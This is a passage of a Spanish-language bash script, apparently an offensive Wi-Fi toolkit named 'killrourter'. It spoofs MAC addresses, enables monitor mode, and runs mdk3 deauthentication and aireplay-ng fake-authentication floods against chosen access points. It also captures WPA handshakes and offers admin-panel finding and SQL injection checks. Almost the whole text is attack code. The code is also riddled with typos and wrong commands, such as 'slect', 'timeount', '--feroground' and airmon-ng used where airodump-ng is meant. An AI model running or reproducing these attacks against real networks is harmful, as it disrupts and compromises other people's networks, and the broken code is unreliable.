...
sleep 3
echo -e "$violeta2(*)$azul para ver el sitio dirigase a su navegador y coloque$violeta http://localhost$verde"
sleep 3
echo -e "$vioelta2(*)$azul Volviendo al menu principal..$verde"
sleep 2
menu_principal
...
;;
*)
echo -e "$rojo(ERROR)$azul $REPLY $verde Opcion no validad $verde"
;;
esac
done
;;
...
$w2)
echo -e "$violeta2(*) Please wait..$verde"
sleep 3 
obtenerpanel
;;
...
echo -e "$violeta(*)$azul Please wait..$verde"
sleep 3
verificarsqli
;;
$w4)
...
function menu_principal(){
    echo
    echo
    slect menu in "$a" "$b" "$c" "$new" "$e" "$opdate" "$f";
    do
        case $menu in
...
echo -e "$nc($azul*$nc)$verde TU direcion MAC fue falsificada correctamente!!"
sleep 2
...
sleep 2
echo -e "$nc($azul*$nc)$verde AVISO: Espera 10 segundos$verde cuando inicie el analisis"
eleep 9
timeout --foreground 12s airodump-ng $interface$airmon-ng$mon 
echo 
echo
...
timeount --foreground $sec$s mdk3 $interface$mon d -b$doc -c $ch 
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo modo minitor$verde"
sleep 2
...
echo -e "$nc($azul*$nc)$verde Este Ataque realizara un flood de intentos de conexion al rourter"
sleep 2
echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
sleep 2
echo 
...
sleep 9
timeout --feroground 20s airodump-ng $interface$mon 
echo
...
read essid
sleep 1
read -p "Añade la duracion del ataque en sugundos ➜ " sec 
sleep 2
echo -e "$nc($azul*$nc)$verde El ataque comenzara en 5 segundos.."
sleep 1
echo "4 segundos"
...
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo el modo monitor$verde"
sleep 2
airmon-ng stop $inrerface$mon 
menu_principal
...
sleep 2
echo -e "$nc($azul*$nc)$verde le mostramos sus interfaces de red disponobles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
...
echo -e "$nc($azul*$nc)$verde Direccion de MAC falsificada"
sleep 2
echo -e "$nc($azul*$nc)$verde Iniciando el modo monitor.."
sleep 3
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
...
echo -e "$nc($azul*$nc)$rojo AVISO: Espera 20 segundos$verde cuando inicie el analisis"
sleep 9
timeout --forground 20s airodump-ng $interface$mon 
echo
...
echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
sleep 2
timeout --foreground $sec$s xterm -hold -e "airmon-ng --bssid -c $ch $interface" &
sleep 1
timeout --foreground $sec$s xterm -hold -e "aireplay-ng --fakeauth 2 -a $bssid -c $val $interface$mon" &
sleep 1
timeout --foreground $sec$s xterm -hold -e "aireplay-ng --fakeunth 2 -a $bssid -h $val $interface$mon" 
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
airmon-ng stop $interface$mon 
menu_principal
...
#verificacion mode monitor and exit
...
then
    airmon-ng stop wlan0mon
    echo -e "$nc($azul*$nc)$verde Modo monitoe..$nc"
    sleep 1
fi
...
echo -e "$nc($azul*$nc)$verde Este Ataque capturara un Handshake de un RED"
sleep 2
echo -e "$nc($azul*$nc)$verde Les mostraremos sus unterfaces disponibles"
sleep 2
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
...
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_sipplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
sleep 2
...
sleep 9
timeout --foreground 25s airmon-ng $interface$mon 
echo
echo
...
echo $bssid > $doc
sleep 2
read -p "Añade le depuracion del ataque(deauth) en segundos ➜ " sec 
sleep 2
echo -e "$nc($azul*$nc)$verde El ataque sera realizado el BSSID:$azul $bssid $verde En el Canal: $ch"
sleep 2
echo -e "$nc($azul*$nc)$verde el ataque iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
...
timeout --foregroind 60s xterm -hold -e "aireplay-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon"
echo -e "$nc($aul*$nc)$verde El handshake fue capturado exitosamente PATH:$azul handshake/$doc.cap"
sleep 4
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azuL*$nc)$verde Deteniendo modo monitor$verde"
...
if ping -q -w 1 -c 1 google.com > /dev/null; then
    ...
    then
        rm $directory/killrourter
    fi
    curl https://raw.githubusercontent.com/Alvarex7777/killrourter.sh > killrourter.sh 
    echo -e "$nc($azul*$nc)$verde Programa Actualizado.. Vuelve a ejecutarlo nuevamanete..$nc"
    sleep 2
    exit
else
    echo
...
#Verificando mode monitor and exit

if [[ $checkmode == *wlan0mon* ]]
then
    airmon-ng stop wlan0mon
    echo -e "$nc($azul*$nc)$verde Modo monitor deteniendo..$nc"
    sleep 1
fi
...
echo -e "$nc($azul*$nc)$verde Gracias por usar nuestro Script $azul by Alvarex7777..$nc"
sleep 2
exit
;;
